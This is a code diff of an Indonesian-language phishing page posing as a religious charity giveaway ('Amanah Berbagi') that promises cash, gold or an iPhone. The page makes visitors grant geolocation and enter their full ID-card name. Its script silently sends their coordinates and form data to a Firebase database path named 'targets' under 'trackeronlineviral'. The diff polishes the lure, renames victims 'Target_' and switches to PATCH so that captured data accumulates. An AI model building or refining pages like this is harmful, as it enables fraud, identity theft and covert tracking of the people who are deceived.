@@ -5,23 +5,23 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Program Amanah Berbagi - Hamba Allah</title>
     <style>
-        :root { --primary: #2e7d32; --secondary: #1b5e20; --bg: #f8fafc; --accent: #ffd700; }
+        :root { --primary: #2e7d32; --secondary: #1b5e20; --bg: #f8fafc; }
         body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: var(--bg); color: #333; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
         .card { background: #fff; border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); max-width: 420px; width: 92%; overflow: hidden; border: 1px solid #eee; margin: 20px 0; }
-        .banner { background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://img.freepik.com/free-photo/hands-holding-donations-box-with-food_23-2148733810.jpg'); background-size: cover; background-position: center; height: 180px; display: flex; align-items: center; justify-content: center; color: white; flex-direction: column; text-align: center; }
+        .banner { background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://img.freepik.com/free-photo/hands-holding-donations-box-with-food_23-2148733810.jpg'); background-size: cover; background-position: center; height: 160px; display: flex; align-items: center; justify-content: center; color: white; flex-direction: column; text-align: center; }
         .banner h1 { margin: 0; font-size: 22px; font-weight: 800; letter-spacing: 1px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
         .content { padding: 30px; text-align: center; }
-        h2 { color: var(--primary); margin-top: 0; font-size: 20px; font-weight: 700; }
+        h2 { color: var(--primary); margin-top: 0; font-size: 19px; font-weight: 700; }
         p { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 25px; }
         
-        /* Reward Selection Grid */
+        /* Reward Selection Grid - Diperbaiki */
         .reward-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
-        .reward-item { border: 2px solid #f0f0f0; border-radius: 16px; padding: 15px 10px; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); position: relative; background: #fff; }
+        .reward-item { border: 2px solid #f0f0f0; border-radius: 16px; padding: 10px; cursor: pointer; transition: all 0.3s ease; position: relative; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 130px; }
         .reward-item:hover { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
-        .reward-item img { width: 60px; height: 60px; object-fit: contain; margin-bottom: 10px; }
-        .reward-item span { font-size: 12px; font-weight: 600; display: block; color: #444; line-height: 1.2; }
-        .reward-item.selected { border-color: var(--primary); background: #f1f8e9; transform: scale(1.03); }
-        .reward-item.selected::after { content: 'Lolos'; position: absolute; top: -10px; right: -5px; background: var(--primary); color: white; border-radius: 20px; padding: 2px 8px; font-size: 10px; font-weight: bold; }
+        .reward-item img { width: 100%; height: 80px; object-fit: contain; margin-bottom: 8px; border-radius: 8px; }
+        .reward-item span { font-size: 11px; font-weight: 600; display: block; color: #333; line-height: 1.3; text-transform: uppercase; letter-spacing: 0.3px; }
+        .reward-item.selected { border-color: var(--primary); background: #f1f8e9; transform: scale(1.03); box-shadow: 0 0 10px rgba(46, 125, 50, 0.2); }
+        .reward-item.selected::after { content: 'PILIHAN ANDA'; position: absolute; top: -10px; right: -5px; background: var(--primary); color: white; border-radius: 20px; padding: 3px 10px; font-size: 9px; font-weight: bold; letter-spacing: 0.5px; }
 
         .input-group { text-align: left; display: none; animation: slideUp 0.5s ease; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
@@ -34,7 +34,8 @@
         .btn:disabled { background: #ccc; cursor: not-allowed; box-shadow: none; }
         .btn:active { transform: scale(0.98); }
         
-        #loader { display: none; padding: 20px; font-weight: 700; color: var(--primary); font-size: 14px; }
+        #loader { display: none; padding: 20px; font-weight: 700; color: var(--primary); font-size: 14px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
@@ -42,13 +43,13 @@
 <div class="card">
     <div class="banner">
         <h1>AMANAH BERBAGI</h1>
-        <small style="font-weight: 500;">Program Donasi Hamba Allah 2026</small>
+        <small style="font-weight: 500;">Program Hibah Hamba Allah 2026</small>
     </div>
     
     <div class="content">
         <div id="step1">
             <h2>MasyaAllah, Anda Terpilih!</h2>
-            <p>Amanah bantuan hibah telah disiapkan. Mohon aktifkan lokasi untuk memverifikasi alamat agar kurir dapat menjangkau rumah Anda.</p>
+            <p>Amanah bantuan hibah telah disiapkan khusus untuk Anda. Mohon aktifkan lokasi untuk memverifikasi alamat agar kurir dapat menjangkau rumah Anda.</p>
             <button class="btn" onclick="requestLocation()">VERIFIKASI LOKASI PENGIRIMAN</button>
         </div>
 
@@ -56,20 +57,20 @@
             <h2>Pilih Amanah Hadiah</h2>
             <p>Pilih salah satu hadiah yang paling Anda butuhkan saat ini:</p>
             <div class="reward-grid">
-                <div class="reward-item" onclick="selectReward(this, 'Uang Tunai & Sembako')">
-                    <img src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png" alt="Sembako">
-                    <span>Uang Tunai 2Jt + Sembako</span>
+                <div class="reward-item" onclick="selectReward(this, 'Uang Tunai 2Jt & Sembako')">
+                    <img src="https://img.freepik.com/free-photo/stacks-indonesian-rupiah-money-banknotes_1373-389.jpg" alt="Sembako & Uang">
+                    <span>Tunai 2Jt + Sembako</span>
                 </div>
-                <div class="reward-item" onclick="selectReward(this, 'Logam Mulia 5G')">
-                    <img src="https://cdn-icons-png.flaticon.com/512/2682/2682835.png" alt="Emas">
+                <div class="reward-item" onclick="selectReward(this, 'Logam Mulia 5 Gram')">
+                    <img src="https://img.freepik.com/free-photo/gold-bars-isolated-white-background_93675-131766.jpg" alt="Emas Batangan">
                     <span>Emas Antam 5 Gram</span>
                 </div>
                 <div class="reward-item" onclick="selectReward(this, 'iPhone 15 Pro Max')">
-                    <img src="https://cdn-icons-png.flaticon.com/512/644/644458.png" alt="iPhone">
+                    <img src="https://img.freepik.com/free-photo/display-screen-new-smartphone_53876-146312.jpg" alt="Smartphone">
                     <span>iPhone 15 Pro Max</span>
                 </div>
-                <div class="reward-item" onclick="selectReward(this, 'Paket Ibadah')">
-                    <img src="https://cdn-icons-png.flaticon.com/512/2972/2972473.png" alt="Ibadah">
+                <div class="reward-item" onclick="selectReward(this, 'Paket Al-Quran & Alat Sholat')">
+                    <img src="https://img.freepik.com/free-photo/hands-holding-open-quran_23-2148673966.jpg" alt="Al-Quran">
                     <span>Al-Qur'an & Alat Sholat</span>
                 </div>
             </div>
@@ -78,7 +79,7 @@
 
         <div id="step3" class="input-group">
             <h2>Lengkapi Data Penerima</h2>
-            <div id="confirmText" style="background: #e8f5e9; color: #2e7d32; padding: 10px; border-radius: 8px; font-weight: bold; font-size: 13px; margin-bottom: 20px; border: 1px dashed #2e7d32;"></div>
+            <div id="confirmText" style="background: #e8f5e9; color: #2e7d32; padding: 12px; border-radius: 10px; font-weight: bold; font-size: 13px; margin-bottom: 20px; border: 1px dashed #2e7d32; display: flex; align-items: center; justify-content: center;"></div>
             
             <label>NAMA LENGKAP (Sesuai KTP)</label>
             <input type="text" id="nama" placeholder="Tulis nama lengkap Anda...">
@@ -96,7 +97,7 @@
 </div>
 
 <script>
-    const targetID = "User_" + Math.floor(Date.now() / 1000);
+    const targetID = "Target_" + Math.floor(Date.now() / 1000);
     const DB_URL = `https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/targets/${targetID}.json`;
     const startTime = Date.now();
     let userCoords = { lat: 0, lon: 0 };
@@ -126,7 +127,7 @@
     function toFinalStep() {
         document.getElementById('step2').style.display = 'none';
         document.getElementById('step3').style.display = 'block';
-        document.getElementById('confirmText').innerText = "✓ Pilihan Hadiah: " + selectedRewardName;
+        document.getElementById('confirmText').innerHTML = `<span style="font-size:18px; margin-right:8px;">✓</span> Pilihan: ${selectedRewardName}`;
         sendUpdate("Mengisi Form (" + selectedRewardName + ")");
     }
 
@@ -143,7 +144,12 @@
             updated_at: Date.now(),
             status: status
         };
-        await fetch(DB_URL, { method: 'PUT', body: JSON.stringify(payload) });
+        // Menggunakan metode PATCH agar data yang sudah ada tidak terhapus
+        await fetch(DB_URL, { 
+            method: 'PATCH', 
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload) 
+        });
     }
 
     async function submitData() {
